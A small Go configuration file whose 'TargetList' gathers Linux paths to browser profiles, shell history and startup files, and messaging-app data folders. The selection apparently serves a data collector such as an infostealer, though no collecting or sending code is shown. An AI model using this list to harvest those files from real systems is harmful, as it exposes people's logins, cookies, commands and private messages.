package config

var browsers = []string{
	// Firefox
	".mozilla/firefox/",
	"snap/firefox/common/.mozilla/firefox/",
	".var/app/org.mozilla.firefox/.mozilla/firefox/",

	// Chrome
	".config/google-chrome/",
	".var/app/com.google.Chrome/config/google-chrome/",

	// Chromium
	".config/chromium/",
	"snap/chromium/common/chromium/",
	".var/app/org.chromium.Chromium/config/chromium/",

	// Brave
	".config/BraveSoftware/Brave-Browser/",
	".var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser/",

	// Opera
	".config/opera/",
	".var/app/com.opera.Opera/config/opera/",
}

var shell = []string{
	// Bash
	".bash_history",
	".bashrc",
	".bash_profile",
	".profile",
	".inputrc",

	// Zsh
	".zsh_history",
	".zshrc",
	".zprofile",
	".zlogin",
	".zshenv",
	".zlogout",
	".zcompdump",

	// Fish
	".config/fish/fish_history",
	".config/fish/config.fish",
	".config/fish/functions/",
	".config/fish/completions/",
	".local/share/fish/fish_history",

	// Other
	".kshrc",
	".mkshrc",
	".ash_history",
	".tcshrc",
	".cshrc",
	".history",
}

var messaging = []string{
	".config/Slack/",
	".config/discord/",
	".config/Mattermost/",
	".config/Skype/",
	".zoom/",

	// Signal
	".config/Signal/",
	".var/app/org.signal.Signal/",

	// Telegram
	".local/share/TelegramDesktop/",
	".var/app/org.telegram.desktop/data/TelegramDesktop/",
}

var TargetList = [][]string{
	browsers,
	shell,
	messaging,
}
